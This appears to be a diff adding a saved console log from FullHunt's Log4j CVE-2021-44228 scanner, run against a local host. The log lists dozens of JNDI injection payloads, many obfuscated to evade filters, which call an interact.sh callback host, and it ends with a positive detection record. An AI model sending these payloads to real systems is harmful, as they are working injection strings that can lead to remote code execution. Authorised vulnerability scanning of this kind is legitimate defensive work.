@@ -1,0 +1,34 @@
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://192.168.1.38:8080/
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${::-j}ndi:rmi://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:rmi://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:rmi://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh}/
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${lower:jndi}:${lower:rmi}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${lower:${lower:jndi}}:${lower:rmi}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:dns://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jnd${123%25ff:-${123%25ff:-i:}}ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:dns://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${k8s:k5:-ND}i:ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:${lower:l}${lower:d}a${lower:p}://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jnd${upper:i}:ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh/5qll9n0}
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[!!!] Targets Affected
+{"timestamp": "2022-03-12T11:23:08.947908239Z", "host": "192.168.1.38.16i102fmhr8445c7r1pr5z5gco9u4245r.16i102fmhr8445c7r1pr5z5gco9u4245r.interact.sh", "remote_address": "80.58.184.19"}
